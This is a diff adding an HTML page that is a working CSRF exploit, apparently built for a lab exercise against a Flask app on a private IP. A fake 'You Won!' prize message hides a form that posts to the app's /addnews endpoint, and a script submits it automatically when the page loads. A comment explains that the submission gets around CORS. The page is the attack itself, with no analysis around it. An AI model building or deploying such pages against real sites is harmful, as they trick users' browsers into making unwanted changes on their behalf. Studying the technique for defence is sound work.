@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Congratulations! You Won!</title>
+</head>
+<body>
+
+    <h2>Loading your prize details...</h2>
+
+    <!-- 
+      We use a native HTML form pointing directly to your Flask IP.
+      This is a "Simple Request" that completely ignores CORS restrictions.
+    -->
+    <form id="csrfForm" action="http://192.168.56.11:5000/addnews" method="POST" style="display: none;">
+        <input type="hidden" name="id" value="5" />
+        <input type="hidden" name="news" value="This request bypassed CORS because it used a native HTML form submission." />
+    </form>
+
+    <script>
+        // Trigger the native browser submission immediately on page load
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        }
+    </script>
+
+</body>
+</html>
